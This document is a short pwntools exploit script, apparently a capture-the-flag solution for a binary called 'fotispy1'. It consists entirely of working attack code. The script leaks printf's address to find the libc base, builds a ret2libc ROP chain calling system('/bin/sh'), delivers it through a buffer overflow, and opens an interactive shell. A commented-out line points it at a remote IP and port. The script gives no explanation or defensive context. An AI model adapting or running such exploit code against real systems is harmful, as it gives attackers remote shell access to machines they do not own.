#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./fotispy1', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process()
# p = remote('52.59.124.14', 5191)


p.sendlineafter(b'[E]: ', b'0')
p.sendlineafter(b'username: ', b'gengg')
p.sendlineafter(b'password: ', b'gengg')

p.sendlineafter(b'[E]: ', b'1')
p.sendlineafter(b'username: ', b'gengg')
p.sendlineafter(b'password: ', b'gengg')


p.sendlineafter(b'[E]: ', b'2') 
p.recvuntil(b'[DEBUG] ')
leaked_printf = int(p.recvline().strip(), 16)
log.success(f"Leaked printf address: {hex(leaked_printf)}")

libc.address = leaked_printf - libc.symbols['printf']
log.success(f"Calculated libc base: {hex(libc.address)}")


p.sendlineafter(b'title: ', b'AAAA')
p.sendlineafter(b'from: ', b'BBBB')

rop = ROP(libc) 
rop.raw(rop.ret.address) 
rop.system(next(libc.search(b"/bin/sh\00"))) 
payload = rop.chain() 

payload = flat(
    b'A' * 13,
    p64(0x4040A0),
    b'A' * 8,
    rop.chain()
)

p.sendlineafter(b'on: ', payload)

p.sendlineafter(b'[E]: ', b'3')

p.interactive()